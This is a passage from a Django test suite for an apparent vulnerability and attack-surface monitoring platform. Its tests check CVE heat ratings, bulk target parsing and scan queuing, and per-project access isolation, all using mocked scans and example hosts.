		domain = Domain.objects.create(name='heat.example', project=project, insert_date=now)
		hot = Subdomain.objects.create(name='hot.heat.example', target_domain=domain, http_status=200)
		Subdomain.objects.create(name='cold.heat.example', target_domain=domain, http_status=200)
		cve = CVEEntry.objects.create(cve_id='CVE-2099-7', kev=True, cvss=9.8, title='t', published_at=now)
		CVEMatch.objects.create(cve_entry=cve, subdomain=hot, confidence=0.9)
		user = User.objects.create_user('heat-admin', password='x', is_superuser=True)
		heat = {h['host']: h['heat'] for h in list_hosts(Ctx(user=user), 'heat-p', {})['results']}
		self.assertEqual(heat, {'hot.heat.example': 'fire', 'cold.heat.example': 'unscanned'})
		subs = {n['label']: n for n in graph_payload(domain.id)['nodes'] if n['kind'] == 'subdomain'}
		self.assertEqual(subs['hot.heat.example']['heat'], 'fire')

		# a light-only nuclei pass (the common case: the AI-targeted pass is gated on there being something worth
		# targeting) must read 'scanned', not 'unscanned' - this is the same ScanActivity-name lookup as heat, in
		# the graph's own node status.
		from scanEngine.models import EngineType
		from startScan.models import ScanActivity, ScanHistory
		light = Subdomain.objects.create(name='light.heat.example', target_domain=domain, http_status=200)
		engine = EngineType.objects.create(engine_name='heat-light', yaml_configuration='x')
		scan = ScanHistory.objects.create(domain=domain, scan_type=engine, start_scan_date=now, scan_status=2)
		light.scan_history = scan
		light.save(update_fields=['scan_history'])
		ScanActivity.objects.create(scan_of=scan, name='nuclei_light_scan', status=2, time=now)
		subs = {n['label']: n for n in graph_payload(domain.id)['nodes'] if n['kind'] == 'subdomain'}
		self.assertEqual(subs['light.heat.example']['status'], 'scanned')
		# the hover card's compact summary rides on the node: no extra request, worst CVE and its tier
		info = subs['hot.heat.example']['info']
		self.assertEqual((info['cves'], info['top_cve'], info['top_tier']), (1, 'CVE-2099-7', 'fire'))
		self.assertEqual(subs['cold.heat.example']['info']['cves'], 0)


class MatchTemperatureTests(TestCase):
	"""A CVE on your own host reads hotter than the same CVE in the feed."""

	def test_rules(self):
		from cveFeed.threat import match_temperature as mt
		self.assertEqual(mt('smoke', 7.5), 'smoke')  # high, nobody has confirmed it affects the host
		self.assertEqual(mt('smoke', 7.5, 'affected'), 'fire')  # high and the AI confirmed it
		self.assertEqual(mt('smoke', 7.5, 'uncertain'), 'smoke')
		self.assertEqual(mt('ice', 4.3, 'affected'), 'ice')  # a low score stays low even when confirmed
		self.assertEqual(mt('fire', None), 'fire')

	def test_host_api_explains_its_colour_and_matches_use_the_host_rating(self):
		from agentapi.services import Ctx, list_hosts, list_matches
		now = timezone.now()
		org = Org.objects.create(name='M', slug='m-t')
		project = Project.objects.create(name='M', slug='mt-p', insert_date=now, org=org)
		domain = Domain.objects.create(name='php.example', project=project, insert_date=now)
		sub = Subdomain.objects.create(name='www.php.example', target_domain=domain, http_status=200)
		cve = CVEEntry.objects.create(cve_id='CVE-2099-9', cvss=7.5, title='PHP-CGI RCE', published_at=now)  # high, no KEV flag
		CVEMatch.objects.create(cve_entry=cve, subdomain=sub, confidence=0.9, ai_verdict='affected')
		user = User.objects.create_user('m-admin', password='x', is_superuser=True)
		host = list_hosts(Ctx(user=user), 'mt-p', {})['results'][0]
		self.assertEqual(host['heat'], 'fire')
		self.assertEqual(host['heat_reasons'][0]['label'], 'CVE-2099-9')
		match = list_matches(Ctx(user=user), 'mt-p', {})['results'][0]
		self.assertEqual((match['cve']['tier'], match['cve']['feed_tier']), ('fire', 'smoke'))


class BulkDiscoveryTests(TestCase):
	"""A large paste queues a discovery for every target, quietly: one summary line, not one per target."""

	def test_every_target_is_queued_with_one_summary_line(self):
		from agentapi.services import Ctx, add_targets
		from cveFeed.models import AgentActivity
		now = timezone.now()
		org = Org.objects.create(name='B', slug='b-d')
		project = Project.objects.create(name='B', slug='bd-p', insert_date=now, org=org)
		EngineType.objects.create(engine_name='e', yaml_configuration='x', default_engine=True)
		user = User.objects.create_user('b-admin', password='x', is_superuser=True)
		names = '\n'.join(f'host{i}.bulk.example' for i in range(12))
		with mock.patch('cveFeed.tasks.run_bbot_discovery.delay') as queued:
			out = add_targets(Ctx(user=user), 'bd-p', names, mode='deep')
		self.assertEqual((out['created'], out['discovery_started'], out['mode']), (12, 12, 'deep'))  # deep for all, no downgrade
		self.assertEqual(queued.call_count, 12)
		self.assertEqual([c.args[1] for c in queued.call_args_list], ['deep'] * 12)
		lines = AgentActivity.objects.filter(kind='discovery', message__startswith='Queued')
		self.assertEqual(lines.count(), 1)
		self.assertIn('12 targets', lines[0].message)
		from startScan.models import ScanHistory
		self.assertEqual(set(ScanHistory.objects.filter(domain__project=project).values_list('initiated_by_id', flat=True)), {user.id})


class ListSummaryTests(TestCase):
	@classmethod
	def setUpTestData(cls):
		from startScan.models import ScanHistory, Vulnerability
		now = timezone.now()
		org = Org.objects.create(name='S', slug='s')
		project = Project.objects.create(name='S', slug='sum-p', insert_date=now, org=org)
		cls.domain = Domain.objects.create(name='sum.example', project=project, insert_date=now)
		Domain.objects.create(name='empty.example', project=project, insert_date=now)
		engine = EngineType.objects.create(engine_name='e', yaml_configuration='x')
		cls.running = ScanHistory.objects.create(domain=cls.domain, scan_type=engine, start_scan_date=now, scan_status=1)
		cls.failed = ScanHistory.objects.create(domain=cls.domain, scan_type=engine, start_scan_date=now, scan_status=0)
		cls.sub = Subdomain.objects.create(name='a.sum.example', target_domain=cls.domain, scan_history=cls.running)
		Subdomain.objects.create(name='b.sum.example', target_domain=cls.domain, scan_history=cls.running)
		Vulnerability.objects.create(name='x', severity=3, scan_history=cls.running, subdomain=cls.sub, target_domain=cls.domain, open_status=True)
		cls.user = User.objects.create_user('sum-admin', password='x', is_superuser=True)

	def test_scans_filter_by_status_and_report_counts(self):
		from agentapi.services import Ctx, list_scans
		ctx = Ctx(user=self.user)
		running = list_scans(ctx, 'sum-p', {'status': 'running'})
		self.assertEqual([s['id'] for s in running['results']], [self.running.id])
		row = running['results'][0]
		self.assertEqual((row['hosts'], row['findings'], row['top_severity']), (2, 1, 'high'))
		self.assertEqual(list_scans(ctx, 'sum-p', {'status': 'failed'})['count'], 1)
		self.assertEqual(list_scans(ctx, 'sum-p', {})['count'], 2)

	def test_targets_report_hosts_and_exposed(self):
		from agentapi.services import Ctx, list_targets
		rows = {t['name']: (t['hosts'], t['exposed']) for t in list_targets(Ctx(user=self.user), 'sum-p', {})['results']}
		self.assertEqual(rows, {'sum.example': (2, 1), 'empty.example': (0, 0)})  # one of two hosts has an open high finding

class ScanDetailApiTests(TestCase):
	@classmethod
	def setUpTestData(cls):
		from startScan.models import EndPoint, ScanActivity, ScanHistory, Vulnerability
		now = timezone.now()
		org1, org2 = Org.objects.create(name='X', slug='x'), Org.objects.create(name='Y', slug='y')
		cls.pa = Project.objects.create(name='A', slug='sa', insert_date=now, org=org1)
		cls.pb = Project.objects.create(name='B', slug='sb', insert_date=now, org=org2)
		cls.da = Domain.objects.create(name='sa.example', project=cls.pa, insert_date=now)
		cls.db = Domain.objects.create(name='sb.example', project=cls.pb, insert_date=now)
		engine = EngineType.objects.create(engine_name='e', yaml_configuration='x')
		cls.scan_a = ScanHistory.objects.create(domain=cls.da, scan_type=engine, start_scan_date=now)
		cls.scan_b = ScanHistory.objects.create(domain=cls.db, scan_type=engine, start_scan_date=now)
		for scan, dom, tag in ((cls.scan_a, cls.da, 'a'), (cls.scan_b, cls.db, 'b')):
			sub = Subdomain.objects.create(name=f'www.s{tag}.example', target_domain=dom, scan_history=scan, http_status=200)
			EndPoint.objects.create(http_url=f'https://www.s{tag}.example/login', scan_history=scan, target_domain=dom, subdomain=sub, http_status=200)
			Vulnerability.objects.create(name=f'vuln-{tag}', severity=3, http_url='https://x', scan_history=scan, target_domain=dom, subdomain=sub)
			ScanActivity.objects.create(scan_of=scan, title='Subdomain Discovery', name='subdomain_discovery', time=now, status=2)
		cls.alice = User.objects.create_user('sdalice', password='x')
		ProjectMembership.objects.create(user=cls.alice, project=cls.pa, role='audit')
		_, cls.tok = create_token(cls.alice, 't')

	def test_scan_subresources_return_only_that_scan(self):
		base = f'/api/v1/projects/sa/scans/{self.scan_a.id}'
		self.assertEqual([s['name'] for s in call(self.tok, 'GET', base + '/subdomains')[1]['results']], ['www.sa.example'])
		self.assertEqual([e['url'] for e in call(self.tok, 'GET', base + '/endpoints')[1]['results']], ['https://www.sa.example/login'])
		vulns = call(self.tok, 'GET', base + '/vulnerabilities')[1]['results']
		self.assertEqual([(v['name'], v['severity']) for v in vulns], [('vuln-a', 'high')])
		act = call(self.tok, 'GET', base + '/activity')[1]['results']
		self.assertEqual((act[0]['name'], act[0]['status']), ('subdomain_discovery', 'success'))
		detail = call(self.tok, 'GET', base)[1]
		self.assertEqual((detail['subdomains'], detail['endpoints'], detail['severity_counts']['high']), (1, 1, 1))
		self.assertEqual(call(self.tok, 'GET', base + '/subdomains?q=nomatch')[1]['count'], 0)

	def test_other_projects_scan_is_404_on_every_subresource(self):
		for sub in ('', '/subdomains', '/endpoints', '/vulnerabilities', '/activity'):
			self.assertEqual(call(self.tok, 'GET', f'/api/v1/projects/sa/scans/{self.scan_b.id}{sub}')[0], 404, sub)
			self.assertEqual(call(self.tok, 'GET', f'/api/v1/projects/sb/scans/{self.scan_b.id}{sub}')[0], 404, sub)

	def test_mcp_scan_tools(self):
		status, data = rpc(self.tok, 'tools/call', {'name': 'list_scan_subdomains', 'arguments': {'project': 'sa', 'scan_id': self.scan_a.id}})
		self.assertFalse(data['result']['isError'])
		status, data = rpc(self.tok, 'tools/call', {'name': 'list_scan_endpoints', 'arguments': {'project': 'sb', 'scan_id': self.scan_b.id}})
		self.assertTrue(data['result']['isError'])


class ScanPageTests(TestCase):
	def test_scan_detail_page_scoped_by_membership(self):
		now = timezone.now()
		org = Org.objects.create(name='Z', slug='z')
		p1 = Project.objects.create(name='P1', slug='p1', insert_date=now, org=org)
		Project.objects.create(name='P2', slug='p2', insert_date=now, org=Org.objects.create(name='Z2', slug='z2'))
		user = User.objects.create_user('scanpager', password='x')
		ProjectMembership.objects.create(user=user, project=p1, role='audit')
		c = client_for(user)
		r = c.get('/cve/p1/scans/42/')
		self.assertEqual(r.status_code, 200)
		self.assertContains(r, 'data-scan="42"')
		self.assertEqual(c.get('/cve/p2/scans/42/').status_code, 404)


class LiveDashboardTests(TestCase):
	@classmethod
	def setUpTestData(cls):
		from cveFeed.models import AgentActivity, DiscoveryEvent
		from startScan.models import ScanHistory
		now = timezone.now()
		cls.org1, cls.org2 = Org.objects.create(name='L1', slug='l1'), Org.objects.create(name='L2', slug='l2')
		cls.pa = Project.objects.create(name='A', slug='la', insert_date=now, org=cls.org1)
		cls.pb = Project.objects.create(name='B', slug='lb', insert_date=now, org=cls.org2)
		cls.da = Domain.objects.create(name='la.example', project=cls.pa, insert_date=now)
		cls.db = Domain.objects.create(name='lb.example', project=cls.pb, insert_date=now)
		engine = EngineType.objects.create(engine_name='e', yaml_configuration='x')
		cls.sa = ScanHistory.objects.create(domain=cls.da, scan_type=engine, start_scan_date=now, scan_status=1)
		cls.sb = ScanHistory.objects.create(domain=cls.db, scan_type=engine, start_scan_date=now, scan_status=1)
		stale = ScanHistory.objects.create(domain=cls.da, scan_type=engine, start_scan_date=now - timezone.timedelta(hours=12), scan_status=1)
		cls.stale = stale
		DiscoveryEvent.objects.create(scan=cls.sa, domain=cls.da, type='DNS_NAME', label='www.la.example', host='www.la.example')
		DiscoveryEvent.objects.create(scan=cls.sb, domain=cls.db, type='DNS_NAME', label='www.lb.example', host='www.lb.example')
		AgentActivity.objects.create(kind='feed', message='Reading the cve.now feed')  # global
		AgentActivity.objects.create(kind='target', message='A target', project=cls.pa)
		AgentActivity.objects.create(kind='target', message='B secret target', project=cls.pb)
		cls.user = User.objects.create_user('liveuser', password='x')
		ProjectMembership.objects.create(user=cls.user, project=cls.pa, role='user')

	def test_activity_feed_is_scoped_but_includes_global_entries(self):
		c = client_for(self.user)
		msgs = [i['message'] for i in c.get('/cve/api/activity').json()['items']]
		self.assertIn('Reading the cve.now feed', msgs)
		self.assertIn('A target', msgs)
		self.assertNotIn('B secret target', msgs)

	def test_discovery_follows_only_visible_scans_and_never_shows_stale_as_running(self):
		c = client_for(self.user)
		d = c.get('/cve/api/discovery').json()
		self.assertEqual(d['scan']['id'], self.sa.id)  # newest running scan the user can see, not B's
		self.assertEqual([e['label'] for e in d['events']], ['www.la.example'])
		self.assertEqual(c.get(f'/cve/api/discovery?scan={self.sb.id}').json()['scan'], None)  # B's scan is invisible
		stats = c.get('/cve/api/stats').json()
		self.assertEqual(stats['scans_running'], 1)  # the 12-hour-old "running" scan is not counted
		self.assertEqual(stats['targets'], 1)
		again = c.get(f'/cve/api/discovery?scan={self.sa.id}&after={d["events"][-1]["id"]}').json()
		self.assertEqual(again['events'], [])

	def test_dashboard_hosts_carry_their_project_and_can_be_narrowed(self):
		"""The dashboard spans every visible project; each host node names its own project (for the map link), and ?project= narrows."""
		from startScan.models import Subdomain
		ProjectMembership.objects.create(user=self.user, project=self.pb, role='user')
		for name, domain, scan, addr in (('www.la.example', self.da, self.sa, '203.0.113.21'), ('hr.lb.example', self.db, self.sb, '203.0.113.22')):
			Subdomain.objects.create(name=name, target_domain=domain, scan_history=scan).ip_addresses.add(IpAddress.objects.create(address=addr))
		c = client_for(self.user)
		hosts = lambda q: sorted(n['label'] for n in c.get(f'/cve/api/graph{q}').json()['nodes'] if n['kind'] == 'subdomain')
		self.assertEqual(hosts(''), ['hr.lb.example', 'www.la.example'])  # no project: everything the user may see
		owner = {n['label']: n['project'] for n in c.get('/cve/api/graph').json()['nodes'] if n['kind'] == 'subdomain'}
		self.assertEqual(owner, {'www.la.example': 'la', 'hr.lb.example': 'lb'})  # map tiles open the host's own project
		self.assertEqual(hosts('?project=la'), ['www.la.example'])
		self.assertEqual(hosts('?project=lb'), ['hr.lb.example'])
		self.assertEqual(c.get('/cve/api/stats?project=la').json()['targets'], 1)
		msgs = [i['message'] for i in c.get('/cve/api/activity?project=la').json()['items']]
		self.assertIn('A target', msgs)
		self.assertNotIn('B secret target', msgs)
		self.assertIn('Reading the cve.now feed', msgs)  # system-wide lines stay
		self.assertEqual(c.get(f'/cve/api/discovery?project=la&scan={self.sb.id}').json()['scan'], None)

	def test_dashboard_project_the_user_cannot_see_is_not_found(self):
		c = client_for(self.user)
		for path in ('/cve/api/graph', '/cve/api/stats', '/cve/api/activity', '/cve/api/discovery'):
			self.assertEqual(c.get(f'{path}?project=lb').status_code, 404, path)
			self.assertEqual(c.get(f'{path}?project=nope').status_code, 404, path)

	def test_dashboard_redirects_to_welcome_until_onboarded(self):
		root = User.objects.create_superuser('liveroot', 'l@x.io', 'x')
		c = client_for(root)
		r = c.get('/cve/')
		self.assertEqual((r.status_code, r['Location']), (302, '/cve/welcome/'))
		self.assertEqual(c.get('/cve/welcome/').status_code, 200)
		self.assertEqual(client_for(self.user).get('/cve/welcome/').status_code, 403)  # superuser only
		self.assertEqual(client_for(self.user).get('/cve/').status_code, 200)  # members go straight in
		c.post('/cve/api/welcome/finish', content_type='application/json')
		self.assertEqual(c.get('/cve/').status_code, 200)
		self.assertContains(c.get('/cve/'), 'AI activity')


class NodeDetailTests(TestCase):
	@classmethod
	def setUpTestData(cls):
		now = timezone.now()
		cls.pa = Project.objects.create(name='A', slug='na', insert_date=now, org=Org.objects.create(name='N1', slug='n1'))
		cls.pb = Project.objects.create(name='B', slug='nb', insert_date=now, org=Org.objects.create(name='N2', slug='n2'))
		cls.da = Domain.objects.create(name='na.example', project=cls.pa, insert_date=now)
		cls.db = Domain.objects.create(name='nb.example', project=cls.pb, insert_date=now)
		cls.sa = Subdomain.objects.create(name='www.na.example', target_domain=cls.da, http_status=200, page_title='Home')
		cls.sb = Subdomain.objects.create(name='www.nb.example', target_domain=cls.db)
		cls.ipa, cls.ipb = IpAddress.objects.create(address='192.0.2.1'), IpAddress.objects.create(address='192.0.2.2')
		cls.sa.ip_addresses.add(cls.ipa)
		cls.sb.ip_addresses.add(cls.ipb)
		cls.porta = Port.objects.create(number=443, product='nginx', version='1.18')
		cls.portb = Port.objects.create(number=22, product='openssh')
		cls.ipa.ports.add(cls.porta)
		cls.ipb.ports.add(cls.portb)
		cls.user = User.objects.create_user('nodeuser', password='x')
		ProjectMembership.objects.create(user=cls.user, project=cls.pa, role='audit')

	def get(self, node_id):
		return client_for(self.user).get('/cve/api/node', {'id': node_id})

	def test_details_for_each_kind_of_node(self):
		d = self.get(f'sub:{self.sa.id}').json()
		self.assertEqual((d['kind'], d['title']), ('host', 'www.na.example'))
		self.assertIn('443 nginx 1.18', {r['k']: r['v'] for r in d['rows']}['Open ports'])
		self.assertEqual(self.get(f'dom:{self.da.id}').json()['title'], 'na.example')
		self.assertEqual(self.get(f'ip:{self.ipa.id}').json()['title'], '192.0.2.1')
		self.assertEqual(self.get(f'port:{self.ipa.id}:{self.porta.id}').json()['title'], '192.0.2.1:443')

	def test_other_projects_nodes_cannot_be_read_by_guessing_ids(self):
		for node_id in (f'sub:{self.sb.id}', f'dom:{self.db.id}', f'ip:{self.ipb.id}', f'port:{self.ipb.id}:{self.portb.id}',
		                f'port:{self.ipa.id}:{self.portb.id}'):  # the last pairs A's IP with B's port
			self.assertEqual(self.get(node_id).status_code, 404, node_id)
		self.assertEqual(self.get('nonsense').status_code, 404)
		self.assertEqual(self.get('sub:abc').status_code, 404)


class WholeProjectGraphTests(TestCase):
	"""The dashboard graph must show every domain in the project at once, each with its own discovered
	relationships, not just whichever scan happens to be the most recent (regression: a project with two
	domains only showed the one tied to the last scan, and an empty/broken scan blanked the whole graph)."""

	@classmethod
	def setUpTestData(cls):
		from cveFeed.models import DiscoveryEvent
		from scanEngine.models import EngineType
		from startScan.models import ScanHistory
		now = timezone.now()
		org = Org.objects.create(name='G', slug='g')
		cls.pa = Project.objects.create(name='G', slug='gp', insert_date=now, org=org)
		cls.other = Project.objects.create(name='Other', slug='gother', insert_date=now, org=Org.objects.create(name='O', slug='o'))
		cls.d1 = Domain.objects.create(name='one.example', project=cls.pa, insert_date=now)
		cls.d2 = Domain.objects.create(name='two.example', project=cls.pa, insert_date=now)
		cls.outside = Domain.objects.create(name='outside.example', project=cls.other, insert_date=now)
		engine = EngineType.objects.create(engine_name='e', yaml_configuration='x')
		scan1 = ScanHistory.objects.create(domain=cls.d1, scan_type=engine, start_scan_date=now, scan_status=2)
		scan2 = ScanHistory.objects.create(domain=cls.d2, scan_type=engine, start_scan_date=now, scan_status=2)
		Subdomain.objects.create(name='one.example', target_domain=cls.d1, scan_history=scan1, http_status=200)
		Subdomain.objects.create(name='www.one.example', target_domain=cls.d1, scan_history=scan1, http_status=200)
		Subdomain.objects.create(name='two.example', target_domain=cls.d2, scan_history=scan2, http_status=200)
		Subdomain.objects.create(name='never-resolved.two.example', target_domain=cls.d2, scan_history=scan2)  # answered nothing: not drawn
		Subdomain.objects.create(name='outside.example', target_domain=cls.outside)
		DiscoveryEvent.objects.create(scan=scan1, domain=cls.d1, type='DNS_NAME', label='www.one.example', host='www.one.example', parent_host='one.example')
		DiscoveryEvent.objects.create(scan=scan2, domain=cls.d2, type='DNS_NAME', label='two.example', host='two.example', parent_host='')
		cls.user = User.objects.create_user('graphuser', password='x')
		ProjectMembership.objects.create(user=cls.user, project=cls.pa, role='audit')

	def test_graph_shows_every_domain_in_the_project_with_its_own_edges_not_just_the_latest_scan(self):
		r = client_for(self.user).get('/cve/api/graph')
		status, data = r.status_code, r.json()
		self.assertEqual(status, 200)
		self.assertEqual({(n['kind'], n['label']) for n in data['nodes']}, {
			('domain', 'one.example'), ('subdomain', 'one.example'), ('subdomain', 'www.one.example'),
			('domain', 'two.example'), ('subdomain', 'two.example')})  # both project domains, outside project excluded
		self.assertNotIn('port', {n['kind'] for n in data['nodes']})  # ports live on the host card, not the graph
		by_kind_label = {f"{n['kind']}:{n['label']}": n['id'] for n in data['nodes']}
		sub_www = by_kind_label['subdomain:www.one.example']
		sub_one = by_kind_label['subdomain:one.example']
		sub_two = by_kind_label['subdomain:two.example']
		self.assertIn({'from': sub_one, 'to': sub_www}, data['edges'])  # discovery edge from scan1 kept
		self.assertNotIn(sub_two, [e['to'] for e in data['edges'] if e['from'] == sub_one])  # the two domains' trees are separate


class AssetStatusColorCodingTests(TestCase):
	"""Hosts on the graph are coloured by how far along they are: hollow when nothing has scanned them
	yet (e.g. found only by certificate-transparency monitoring), green once scanned with nothing worth
	flagging, red when something open and non-informational (or an unresolved CVE match) was found."""

	@classmethod
	def setUpTestData(cls):
		from cveFeed.models import CVEMatch
		from startScan.models import Vulnerability
		now = timezone.now()
		org = Org.objects.create(name='AS', slug='as')
		cls.project = Project.objects.create(name='AS', slug='asp', insert_date=now, org=org)
		cls.domain = Domain.objects.create(name='as.example', project=cls.project, insert_date=now)
		cls.ct_found = Subdomain.objects.create(name='ct.as.example', target_domain=cls.domain, http_status=200)  # no scan, no findings
		cls.clean = Subdomain.objects.create(name='clean.as.example', target_domain=cls.domain, http_status=200)
		Vulnerability.objects.create(name='info finding', severity=0, http_url='https://x', target_domain=cls.domain,
			subdomain=cls.clean, open_status=True)
		cls.vuln_host = Subdomain.objects.create(name='vuln.as.example', target_domain=cls.domain, http_status=200)
		Vulnerability.objects.create(name='real finding', severity=3, http_url='https://y', target_domain=cls.domain,
			subdomain=cls.vuln_host, open_status=True)
		cls.resolved_host = Subdomain.objects.create(name='resolved.as.example', target_domain=cls.domain, http_status=200)
		Vulnerability.objects.create(name='old finding', severity=4, http_url='https://z', target_domain=cls.domain,
			subdomain=cls.resolved_host, open_status=False)  # no longer open: not "vulnerable"
		cls.cve_host = Subdomain.objects.create(name='cve.as.example', target_domain=cls.domain, http_status=200)
		cve = CVEEntry.objects.create(cve_id='CVE-2099-9', cvss=9.8, published_at=now)
		CVEMatch.objects.create(cve_entry=cve, subdomain=cls.cve_host, confidence=0.9, ai_verdict='affected')
		cls.ruled_out_host = Subdomain.objects.create(name='ruledout.as.example', target_domain=cls.domain, http_status=200)
		CVEMatch.objects.create(cve_entry=cve, subdomain=cls.ruled_out_host, confidence=0.9, ai_verdict='not_affected')
		cls.user = User.objects.create_user('assetstatususer', password='x')
		ProjectMembership.objects.create(user=cls.user, project=cls.project, role='audit')

	def statuses(self):
		data = client_for(self.user).get('/cve/api/graph').json()
		return {n['label']: n['status'] for n in data['nodes'] if n['kind'] == 'subdomain'}

	def test_each_case_gets_the_right_status(self):
		s = self.statuses()
		self.assertEqual(s['ct.as.example'], 'unscanned')
		self.assertEqual(s['clean.as.example'], 'scanned')  # an info-only finding does not count as "vulnerable"
		self.assertEqual(s['vuln.as.example'], 'vulnerable')
		self.assertEqual(s['resolved.as.example'], 'scanned')  # the finding was closed, so no longer flagged
		self.assertEqual(s['cve.as.example'], 'vulnerable')  # AI-confirmed CVE match
		self.assertEqual(s['ruledout.as.example'], 'unscanned')  # AI ruled it out; nothing else touched this host


class BulkTargetTests(TestCase):
	@classmethod
	def setUpTestData(cls):
		now = timezone.now()
		cls.pa = Project.objects.create(name='A', slug='ba', insert_date=now, org=Org.objects.create(name='B1', slug='b1'))
		cls.pb = Project.objects.create(name='B', slug='bb', insert_date=now, org=Org.objects.create(name='B2', slug='b2'))
		EngineType.objects.create(engine_name='e', yaml_configuration='x', default_engine=True)
		cls.user, cls.audit = User.objects.create_user('bulk', password='x'), User.objects.create_user('bulkaudit', password='x')
		ProjectMembership.objects.create(user=cls.user, project=cls.pa, role='user')
		ProjectMembership.objects.create(user=cls.audit, project=cls.pa, role='audit')
		_, cls.tok = create_token(cls.user, 't')
		_, cls.tok_audit = create_token(cls.audit, 'a')

	def test_parse_target_list(self):
		from agentapi.services import parse_target_list
		self.assertEqual(parse_target_list('A.com, b.com\n# comment\n10.0.0.1  a.com ;c.com # tail'), ['a.com', 'b.com', '10.0.0.1', 'c.com'])
		self.assertEqual(parse_target_list(''), [])

	def test_parse_target_list_reduces_urls_to_hosts(self):
		from agentapi.services import parse_target_list
		text = ('#Widgets\nwidgets-example.ai\nhttp://autodiscover.widgets-example.ai/\nhttps://prod-fe-collect.widgets-example.ai/api/collect\n'
				'[www.widgets-example.ai](https://www.widgets-example.ai)\nwidgets-example.ai \nssh://admin:pw@Host.Example.com:2222/p?q=1#f\n'
				'*.wild.example.com\ntrailing.example.org.\nEXAMPLE.net:8443\nfoo.com/bar\n100.1.2.3\n100.1.2.3/32\n'
				'10.0.0.0/28\n192.168.1.1-20\n[2001:db8::2]:443\n2001:db8::/48')
		self.assertEqual(parse_target_list(text), [
			'widgets-example.ai', 'autodiscover.widgets-example.ai', 'prod-fe-collect.widgets-example.ai', 'www.widgets-example.ai', 'host.example.com',
			'wild.example.com', 'trailing.example.org', 'example.net', 'foo.com', '100.1.2.3', '10.0.0.0/28', '192.168.1.1-20',
			'2001:db8::2', '2001:db8::/48'])

	def test_bulk_add_accepts_pasted_urls(self):
		text = 'https://u.example/\nhttp://v.example/path\n[w.example](https://w.example)'
		status, data = call(self.tok, 'POST', '/api/v1/projects/ba/targets/bulk', {'text': text, 'discover': False})
		self.assertEqual((status, data['created'], data['invalid']), (201, 3, []))

	def test_bulk_add_reports_every_line_and_starts_discovery(self):
		text = 'one.example\ntwo.example, 203.0.113.0/30\nnot a target\n!!bad\none.example'
		with mock.patch('cveFeed.tasks.run_bbot_discovery.delay') as queued:
			status, data = call(self.tok, 'POST', '/api/v1/projects/ba/targets/bulk', {'text': text, 'mode': 'passive'})
		self.assertEqual(status, 201)
		self.assertEqual((data['received'], data['created'], data['discovery_started']), (7, 4, 4))  # /30 = 2 hosts; the duplicate line is dropped
		self.assertEqual([i['value'] for i in data['invalid']], ['not', 'a', 'target', '!!bad'])
		self.assertTrue(all(i['error'] for i in data['invalid']))
		self.assertEqual(queued.call_count, 4)
		self.assertEqual(queued.call_args[0][1], 'passive')

	def test_bulk_add_without_discovery_and_existing_names(self):
		with mock.patch('cveFeed.tasks.run_bbot_discovery.delay') as queued:
			call(self.tok, 'POST', '/api/v1/projects/ba/targets/bulk', {'targets': ['dup.example'], 'discover': False})
			status, data = call(self.tok, 'POST', '/api/v1/projects/ba/targets/bulk', {'targets': ['dup.example', 'new.example'], 'discover': False})
		self.assertEqual((data['created'], data['already_exists'], data['discovery_started']), (1, ['dup.example'], 0))
		queued.assert_not_called()

	def test_bulk_limits_and_permissions(self):
		self.assertEqual(call(self.tok, 'POST', '/api/v1/projects/ba/targets/bulk', {'text': ''})[0], 400)
		from agentapi import services
		many = '\n'.join(f'h{i}.example' for i in range(services.BULK_MAX_ENTRIES + 1))
		self.assertEqual(call(self.tok, 'POST', '/api/v1/projects/ba/targets/bulk', {'text': many})[0], 400)
		self.assertEqual(call(self.tok_audit, 'POST', '/api/v1/projects/ba/targets/bulk', {'text': 'x.example'})[0], 403)
		self.assertEqual(call(self.tok, 'POST', '/api/v1/projects/bb/targets/bulk', {'text': 'x.example'})[0], 404)

	def test_bulk_adding_120_targets_queues_120_discoveries_in_insertion_order(self):
		text = '\n'.join(f'q{i:03d}.example' for i in range(120))
		with mock.patch('cveFeed.tasks.run_bbot_discovery.delay') as queued:
			status, data = call(self.tok, 'POST', '/api/v1/projects/ba/targets/bulk', {'text': text})
		self.assertEqual((status, data['created'], data['discovery_started']), (201, 120, 120))
		sent = [c[0][0] for c in queued.call_args_list]
		self.assertEqual(len(sent), 120)
		self.assertEqual(sent, sorted(sent))  # first in, first out
		from startScan.models import ScanHistory
		self.assertEqual([ScanHistory.objects.get(pk=i).domain.name for i in sent], [f'q{i:03d}.example' for i in range(120)])
		self.assertEqual(set(ScanHistory.objects.filter(id__in=sent).values_list('scan_status', flat=True)), {-1})

	def test_a_slash_24_queues_254_discoveries_and_every_ip(self):
		with mock.patch('cveFeed.tasks.run_bbot_discovery.delay') as queued:
			status, data = call(self.tok, 'POST', '/api/v1/projects/ba/targets', {'value': '203.0.113.0/24', 'discover': True})
		self.assertEqual((status, len(data['created']), len(data['scan_ids'])), (201, 254, 254))
		self.assertEqual(queued.call_count, 254)

	def test_a_cidr_larger_than_the_cap_is_refused_before_it_is_expanded(self):
		status, data = call(self.tok, 'POST', '/api/v1/projects/ba/targets', {'value': '203.0.0.0/8'})
		self.assertEqual(status, 400)
		self.assertIn('the cap is', data['error'])

	def test_the_add_cap_can_be_set_from_the_environment(self):
		import importlib
		from agentapi import services
		with mock.patch.dict('os.environ', {'CVENGINE_MAX_TARGETS_PER_ADD': '77'}):
			self.assertEqual(services._max_targets(), 77)
		self.assertEqual(services.TARGET_EXPAND_CAP, 10000)

	def test_a_re_add_while_queued_does_not_queue_a_second_discovery_even_after_ten_minutes(self):
		from datetime import timedelta
		from startScan.models import ScanHistory
		with mock.patch('cveFeed.tasks.run_bbot_discovery.delay') as queued:
			call(self.tok, 'POST', '/api/v1/projects/ba/targets/bulk', {'text': 'again.example'})
			ScanHistory.objects.update(start_scan_date=timezone.now() - timedelta(hours=3))
			from targetApp.models import Domain
			from cveFeed.discovery import start_discovery
			start_discovery(Domain.objects.get(name='again.example'))
		self.assertEqual(queued.call_count, 1)
		self.assertEqual(ScanHistory.objects.filter(domain__name='again.example').count(), 1)

	def test_queued_scans_report_how_many_are_ahead(self):
		with mock.patch('cveFeed.tasks.run_bbot_discovery.delay'):
			status, data = call(self.tok, 'POST', '/api/v1/projects/ba/targets/bulk', {'text': 'p1.example\np2.example\np3.example'})
		ids = data['scan_ids']
		_, listing = call(self.tok, 'GET', '/api/v1/projects/ba/scans')
		self.assertEqual({r['id']: r['queue_position'] for r in listing['results']}, {ids[0]: 0, ids[1]: 1, ids[2]: 2})
		_, one = call(self.tok, 'GET', f'/api/v1/projects/ba/scans/{ids[2]}')
		self.assertEqual((one['status'], one['queue_position']), (-1, 2))

	def test_parse_org_text(self):
